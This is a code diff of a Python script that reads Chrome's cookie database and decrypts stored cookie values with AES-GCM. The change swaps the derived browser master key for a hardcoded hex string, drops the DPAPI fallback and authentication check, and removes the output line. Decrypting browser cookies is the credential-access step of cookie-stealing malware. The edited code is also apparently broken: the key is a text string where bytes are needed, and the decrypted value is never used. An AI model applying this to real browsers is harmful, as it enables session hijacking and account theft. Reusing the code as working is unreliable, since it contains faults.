@@ -133,27 +133,18 @@ data = data.decode('utf-8')
 # Deserialize s (a str, bytes or bytearray instance containing a JSON document) 
 # to a Python object using this conversion table.
 data = json.loads(data)
-key = get_chrome_cookies_master_key(data)
-
+key = "1fac75ae4445dd3e4b36e172149865a473c839094c1994567c213f8d4f4ec487"
 # Connect to the Database
 conn = sqlite3.connect(db)
 cursor = conn.cursor()
-conn.text_factory = bytearray
+conn.text_factory = bytes
 
 # Get the results
 cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
 arr = []
 for host_key, name, value, encrypted_value in cursor.fetchall():
-
-    # Decrypt the encrypted_value
-    try:
-        # Try to decrypt as AES (2020 method)
-        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
-        decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
-    except:
-        # If failed try with the old method
-        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0
-
-    print(host_key, decrypted_value)
+    # Try to decrypt as AES (2020 method)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
+    decrypted_cookie = cipher.decrypt(encrypted_value[15:-16])
 conn.commit()
 conn.close()
